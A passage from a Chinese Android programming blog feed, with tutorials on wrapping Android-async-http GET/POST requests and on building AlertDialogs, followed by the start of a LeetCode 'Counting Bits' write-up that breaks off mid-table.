    <content><![CDATA[<p>　　Http 网络数据交互是 Android 中极其重要并且使用很频繁的模块。前段时间写了一篇博客总结了 Android Http 网络请求，但是其中还有很多没有考虑到的问题。众所周知，网络请求方式的效率和性能直接影响到 App 的整体用户体验流畅性，在我们自己编写网络请求方法中往往不会考虑这么周全。但是，还好有技术大牛为我们提供了开源的第三方网络请求框架：Android-async-http。</p>
<a id="more"></a>
<h4 id="Android-async-http简介"><a href="#Android-async-http简介" class="headerlink" title="Android-async-http简介"></a>Android-async-http简介</h4><p>　　Async-http 是一款国外的开源框架，是基于 Apache HttpClient 库的，使用它可以方便快速高效的进行网络数据请求和发送，文件下载和上传。</p>
<p><strong>特点：</strong></p>
<ul>
<li>清晰的网络请求回调；</li>
<li>内部采用线程池来处理并发请求，限制并发资源使用情况；</li>
<li>http 请求发生在 UI（主）线程之外的异步线程中；</li>
<li>内置多部分文件上传，不需要第三方库支持；</li>
<li>流式 Json 上传，不需要额外的库；</li>
<li>在各种各样的移动连接环境中具备自动智能请求重试机制。</li>
</ul>
<h4 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h4><h5 id="下载jar包"><a href="#下载jar包" class="headerlink" title="下载jar包"></a>下载jar包</h5><ol>
<li><p>Github地址：<a href="https://github.com/loopj/android-async-http" target="_blank" rel="external">https://github.com/loopj/android-async-http</a></p>
</li>
<li><p>CSDN下载地址：<a href="http://download.csdn.net/detail/bambooofmottled/7866567" target="_blank" rel="external">http://download.csdn.net/detail/bambooofmottled/7866567</a></p>
</li>
<li><p>也可以自己百度去找，这是一个很受欢迎的开源框架，资源很丰富。</p>
</li>
</ol>
<h5 id="添加到工程"><a href="#添加到工程" class="headerlink" title="添加到工程"></a>添加到工程</h5><p>　　将 jar 包复制到工程的 libs 目录下，右键移到 Build Path 然后点击 Add to Build Path。</p>
<h5 id="封装自己的Http请求类"><a href="#封装自己的Http请求类" class="headerlink" title="封装自己的Http请求类"></a>封装自己的Http请求类</h5><p>　　封装了 HTTP 请求中最常见的 GET 和 POST 方法的请求，通过 Handler 在异步网络请求与 UI 主线程之间来传递消息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AsyncHttpClient client;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(String url, <span class="keyword">final</span> Handler handler)</span> </span>&#123;</div><div class="line">        client = <span class="keyword">new</span> AsyncHttpClient();</div><div class="line">        <span class="comment">//可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key</span></div><div class="line">        client.addHeader(<span class="string">"键"</span>, <span class="string">"值"</span>);</div><div class="line">        client.get(url, <span class="keyword">new</span> AsyncHttpResponseHandler() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(<span class="keyword">int</span> statusCode, Header[] headers,<span class="keyword">byte</span>[] responseBody)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(responseBody);</div><div class="line">                System.out.println(response);   <span class="comment">//打印接收到的数据，以便调试</span></div><div class="line">                Message msg = <span class="keyword">new</span> Message();    <span class="comment">//将数据封装到Message中</span></div><div class="line">                msg.obj = response;</div><div class="line">                handler.sendMessage(msg);   <span class="comment">//使用Handler将Message传给UI线程，以便刷新界面</span></div><div class="line">            &#125;</div><div class="line">    </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="keyword">int</span> statusCode, Header[] headers,<span class="keyword">byte</span>[] responseBody, Throwable error)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(responseBody);</div><div class="line">                System.out.println(response);   <span class="comment">//打印错误信息，以便调试</span></div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(String url, RequestParams params,<span class="keyword">final</span> Handler handler)</span> </span>&#123;</div><div class="line">        client = <span class="keyword">new</span> AsyncHttpClient();</div><div class="line">        <span class="comment">//可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key</span></div><div class="line">        client.addHeader(<span class="string">"键"</span>, <span class="string">"值"</span>);</div><div class="line">        client.post(url, params, <span class="keyword">new</span> AsyncHttpResponseHandler() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(<span class="keyword">int</span> statusCode, Header[] headers,<span class="keyword">byte</span>[] responseBody)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(responseBody);</div><div class="line">                System.out.println(response);   <span class="comment">//打印接收到的数据，以便调试</span></div><div class="line">                Message msg = <span class="keyword">new</span> Message();</div><div class="line">                msg.obj = response; <span class="comment">//将数据封装到Message中</span></div><div class="line">                handler.sendMessage(msg);   <span class="comment">//使用Handler将Message传给UI线程，以便刷新界面</span></div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="keyword">int</span> statusCode, Header[] headers,<span class="keyword">byte</span>[] responseBody, Throwable error)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(responseBody);</div><div class="line">                System.out.println(response);   <span class="comment">//打印错误信息，以便调试</span></div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>　　调用自己封装好的 GET 请求和 POST 请求方法都需要传递 Handler 来传递消息，以便在网络请求我完成时，将服务器返回的数据传递给 UI 线程，然后进行 UI 更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> Handler mGetHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(android.os.Message msg)</span> </span>&#123;</div><div class="line">            String res = (String) msg.obj;</div><div class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"请求成功"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">            System.out.println(res);    <span class="comment">//打印传递过来的数据</span></div><div class="line">            </div><div class="line">            <span class="comment">//此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新</span></div><div class="line">        &#125;;</div><div class="line">    &#125;;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> Handler mPostHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(android.os.Message msg)</span> </span>&#123;</div><div class="line">            String res = (String) msg.obj;</div><div class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"请求成功"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">            System.out.println(res);    <span class="comment">//打印传递过来的数据</span></div><div class="line">            </div><div class="line">            <span class="comment">//此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新</span></div><div class="line">        &#125;;</div><div class="line">    &#125;;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        </div><div class="line">        String getUrl = <span class="string">"你的get请求的url"</span>;</div><div class="line">        HttpUtil.doGet(getUrl, mGetHandler);</div><div class="line">        </div><div class="line">        String postUrl = <span class="string">"你的post请求的url"</span>;</div><div class="line">        RequestParams params = <span class="keyword">new</span> RequestParams();</div><div class="line">        params.add(<span class="string">"键"</span>, <span class="string">"值"</span>);       <span class="comment">//可通过add方法添加多个请求参数</span></div><div class="line">        HttpUtil.doPost(postUrl, params, mPostHandler);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　此博客主要展示了如何使用 Android-async-http 的 GET 和 POST 请求，这也是我自己在开发中最常用的两个请求方法，虽然这只是这个强大的网络请求库的一部分功能，但是这已经让我的开发变得更方便高效，也使得开发的应用程序的网络请求能够稳定高效，除此之外，Android-async-http 还有很多优秀的功能，有机会再好好挖掘，先分享到这里。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>网络</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>Android AlertDialog 详解</title>
    <url>/2016/08/13/Android%20AlertDialog%20%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>　　AlertDialog 就是 Android 中的弹出式对话框，很多应用中都有对 AlertDialog 的应用。前段时间，一位学长问我自定义 AlertDialog 的问题，因为自己也只是之前用过，并不是很熟悉，所以我也只能很抱歉地回绝了，这一次通过写这篇博客对 AlertDialog 的操作进行了详细的总结，介绍了 AlertDialog 类和 AlertDialog.Builder 类，以及给 AlertDialog 设置不同的内容，最后还实现了自定义的 AlertDialog。</p>
<a id="more"></a>
<p>AlertDialog 继承自 Dialog 类，对于 Android 内置的 AlertDialog，它可以包含一个标题、一个内容消息或者一个选择列表、最多三个按钮。而创建 AlertDialog 推荐使用它的一个内部类 AlertDialog.Builder 创 建，使用 Builder 对象，可以设置 AlertDialog 的各种属性，最后通过 Builder.create() 就可以得到 AlertDialog 对 象，再使用 Builder.show() 方法来显示。官方图解：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-1.png" alt="13-1"></p>
<ol>
<li><p>区域 1 是 AlertDialog 对话框的头部信息区域，包括标题名或者是一个图标。</p>
</li>
<li><p>区域 2 是 AlertDialog 对话框的内容部分，在这里我们可以设置 Message 信息或者是选择框，还可以设置自定义的布局弹出框。</p>
</li>
<li><p>区域 3 是 AlertDialog 对话框的操作按钮部分，可以设置相应的按钮。</p>
</li>
</ol>
<h4 id="AlertDialog类"><a href="#AlertDialog类" class="headerlink" title="AlertDialog类"></a>AlertDialog类</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>setTitle(CharSequence title)</td>
<td>为对话框设置标题</td>
</tr>
<tr>
<td>setIcon(Drawable icon)</td>
<td>通过Drawable资源对象为对话框设置图标</td>
</tr>
<tr>
<td>setIcon(int resId)</td>
<td>通过资源ID为对话框设置图标</td>
</tr>
<tr>
<td>setButton(int whichButton, CharSequence text, DialogInterface.OnClickListener listener)</td>
<td>为对话框添加按钮</td>
</tr>
<tr>
<td>setMessage(CharSequence message)</td>
<td>为对话框设置提示内容</td>
</tr>
</tbody>
</table>
<h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">AlertDialog dialog = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>).create();</div><div class="line">dialog.setTitle(<span class="string">"退出"</span>);</div><div class="line">dialog.setMessage(<span class="string">"是否要退出"</span>);</div><div class="line">dialog.setButton(DialogInterface.BUTTON_NEGATIVE, <span class="string">"取消"</span>,<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface arg0, <span class="keyword">int</span> arg1)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"取消"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">dialog.setButton(DialogInterface.BUTTON_POSITIVE, <span class="string">"确定"</span>,<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface arg0, <span class="keyword">int</span> arg1)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"确定"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">dialog.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-7.png" alt="13-7"></p>
<h4 id="AlertDialog-Builder类"><a href="#AlertDialog-Builder类" class="headerlink" title="AlertDialog.Builder类"></a>AlertDialog.Builder类</h4><p>　　AlertDialog 类提供了弹出框的一些基本的方法，但是要想设置更多的元素来丰富我们的弹出框就要使用到 AlertDialog.Builder 类了。</p>
<h5 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>setTitle(CharSequence title)</td>
<td>为对话框设置标题</td>
</tr>
<tr>
<td>setIcon(Drawable icon)</td>
<td>通过Drawable资源对象为对话框设置图标</td>
</tr>
<tr>
<td>setIcon(int resId)</td>
<td>通过资源ID为对话框设置图标</td>
</tr>
<tr>
<td>setMessage(CharSequence message)</td>
<td>为对话框设置提示内容</td>
</tr>
<tr>
<td>setNegativeButton(CharSequence text, DialogInterface.OnClickListener listener)</td>
<td>为对话框添加取消按钮</td>
</tr>
<tr>
<td>setPositiveButton(CharSequence text, DialogInterface.OnClickListener listener)</td>
<td>为对话框添加确定按钮</td>
</tr>
<tr>
<td>setNeutralButton(CharSequence text, DialogInterface.OnClickListener listener)</td>
<td>为对话框添加中立按钮</td>
</tr>
<tr>
<td>setItems(CharSequence[] items, DialogInterface.OnClickListener listener)</td>
<td>为对话框设置列表项</td>
</tr>
<tr>
<td>setSingleChoiceItems(CharSequence[] items, int checkedItem, DialogInterface.OnClickListener listener)</td>
<td>为对话框设置单选列表项</td>
</tr>
<tr>
<td>setMultiChoiceItems(CharSequence[] items, boolean[] checkedItems, DialogInterface.OnMultiChoiceClickListener listener)</td>
<td>为对话框设置多选列表项</td>
</tr>
</tbody>
</table>
<p>　　注意：<code>setMessage()</code>、<code>setItems()</code>、<code>setSingleChoiceItems()</code>、<code>setMultiChoiceItems()</code> 方法不能同时使用。因为他们都是对弹出框的内容区域的设置。</p>
<h5 id="设置按钮"><a href="#设置按钮" class="headerlink" title="设置按钮"></a>设置按钮</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Builder builder = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>);</div><div class="line">builder.setTitle(<span class="string">"更新"</span>);</div><div class="line">builder.setMessage(<span class="string">"是否要进行更新？"</span>);</div><div class="line">builder.setNegativeButton(<span class="string">"取消"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"取消"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setPositiveButton(<span class="string">"确定"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"确定"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setNeutralButton(<span class="string">"忽略"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"忽略"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-6.png" alt="13-6"></p>
<h5 id="设置列表项"><a href="#设置列表项" class="headerlink" title="设置列表项"></a>设置列表项</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">final</span> CharSequence items[] = <span class="keyword">new</span> String[] &#123;<span class="string">"北京"</span>,<span class="string">"上海"</span>,<span class="string">"广州"</span>,<span class="string">"深圳"</span>,<span class="string">"成都"</span>,<span class="string">"南京"</span>&#125;;</div><div class="line">Builder builder = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</div><div class="line">builder.setTitle(<span class="string">"请选择"</span>);</div><div class="line">builder.setItems(items, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        String selectedItem = items[whitch].toString();</div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, selectedItem, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-5.png" alt="13-5"></p>
<h5 id="设置单选列表项"><a href="#设置单选列表项" class="headerlink" title="设置单选列表项"></a>设置单选列表项</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">final</span> CharSequence items[] = <span class="keyword">new</span> String[] &#123;<span class="string">"北京"</span>,<span class="string">"上海"</span>,<span class="string">"广州"</span>,<span class="string">"深圳"</span>,<span class="string">"成都"</span>,<span class="string">"南京"</span>&#125;;</div><div class="line">Builder builder = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</div><div class="line">builder.setTitle(<span class="string">"请选择"</span>);</div><div class="line">builder.setSingleChoiceItems(items, <span class="number">1</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        String selectedItem = items[whitch].toString();</div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, selectedItem, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setNegativeButton(<span class="string">"取消"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"取消"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setPositiveButton(<span class="string">"确定"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        dialog.dismiss();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-4.png" alt="13-4"></p>
<h5 id="设置多选列表项"><a href="#设置多选列表项" class="headerlink" title="设置多选列表项"></a>设置多选列表项</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">CharSequence items[] = <span class="keyword">new</span> String[] &#123;<span class="string">"北京"</span>,<span class="string">"上海"</span>,<span class="string">"广州"</span>,<span class="string">"深圳"</span>,<span class="string">"成都"</span>,<span class="string">"南京"</span>&#125;;</div><div class="line"><span class="keyword">boolean</span>[] checkedItems = <span class="keyword">new</span> <span class="keyword">boolean</span>[] &#123;<span class="keyword">true</span>,<span class="keyword">false</span>,<span class="keyword">true</span>,<span class="keyword">true</span>,<span class="keyword">false</span>,<span class="keyword">true</span>&#125;;</div><div class="line">        </div><div class="line">Builder builder = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</div><div class="line">builder.setTitle(<span class="string">"请选择"</span>);</div><div class="line">builder.setMultiChoiceItems(items, checkedItems, <span class="keyword">new</span> OnMultiChoiceClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch, <span class="keyword">boolean</span> isChecked)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">    </div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setNegativeButton(<span class="string">"取消"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"取消"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setPositiveButton(<span class="string">"确定"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        dialog.dismiss();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-3.png" alt="13-3"></p>
<h4 id="自定义AlertDialog"><a href="#自定义AlertDialog" class="headerlink" title="自定义AlertDialog"></a>自定义AlertDialog</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Builder builder = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</div><div class="line">builder.setTitle(<span class="string">"请输入"</span>);</div><div class="line"><span class="comment">// 通过LayoutInflater来加载布局文件作为一个View对象</span></div><div class="line">View view = LayoutInflater.from(MainActivity.<span class="keyword">this</span>).inflate(R.layout.alterdialog, <span class="keyword">null</span>);</div><div class="line"><span class="comment">// 设置自定义的布局文件作为弹出框的内容</span></div><div class="line">builder.setView(view);</div><div class="line"><span class="keyword">final</span> EditText username = (EditText) view.findViewById(R.id.et_username);</div><div class="line"><span class="keyword">final</span> EditText password = (EditText) view.findViewById(R.id.et_password);</div><div class="line"></div><div class="line">builder.setPositiveButton(<span class="string">"确定"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        String name = username.getText().toString().trim();</div><div class="line">        String pwd = password.getText().toString().trim();</div><div class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, name + pwd, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.setNegativeButton(<span class="string">"取消"</span>, <span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> whitch)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        dialog.dismiss();</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">builder.show();</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/13-2.png" alt="13-2"></p>
<p>　　以上多个方法的参数列表都有用到 CharSequence，但是我的例子中直接使用的 String，所以在这里做一个补充说明。</p>
<p><strong>CharSequence与String的区别：</strong></p>
<p>　　CharSequence 与 String 都能用于定义字符串，但 CharSequence 的值是可读可写序列，而 String 的值是只读序列。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>AlertDialog</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(二)</title>
    <url>/2016/08/12/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%8C/</url>
    <content><![CDATA[<h4 id="Counting-Bits"><a href="#Counting-Bits" class="headerlink" title="Counting Bits"></a>Counting Bits</h4><p>LeetCode第338题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given a non negative integer number num. For every numbers i in the range 0 ≤ i ≤ num calculate the number of 1’s in their binary representation and return them as an array.</p>
<a id="more"></a>
<p>Example:<br>For num = 5 you should return [0,1,1,2,1,2].</p>
<p>Follow up:</p>
<p>It is very easy to come up with a solution with run time O(n*sizeof(integer)). But can you do it in linear time O(n) /possibly in a single pass?</p>
<p>Space complexity should be O(n).</p>
<p>Can you do it like a boss? Do it without using any builtin function like __builtin_popcount in c++ or in any other language.</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>列出前16个数的二进制表示以及1的个数：</p>
<table>
<thead>
<tr>
<th style="text-align:center">n(十进制表示)</th>
<th style="text-align:center">n(二进制表示)</th>
<th style="text-align:center">count[n]（1的个数）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0000</td>
<td style="text-align:center">count[1] = 0</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0001</td>
<td style="text-align:center">count[1] = 1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">0010</td>
<td style="text-align:center">count[2] = 1</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">0011</td>
<td style="text-align:center">count[3] = 2</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">0100</td>
<td style="text-align:center">count[4] = 1</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">0101</td>
<td style="text-align:center">count[5] = 2 = count[4] + count[1]</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">0110</td>
<td style="text-align:center">count[6] = 2 = count[4] + count[2]</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">0111</td>
<td style="text-align:center">count[7] = 3 = count[4] + count[3]</td>
</tr>
<tr>
<td style="text-align:center">8</td>
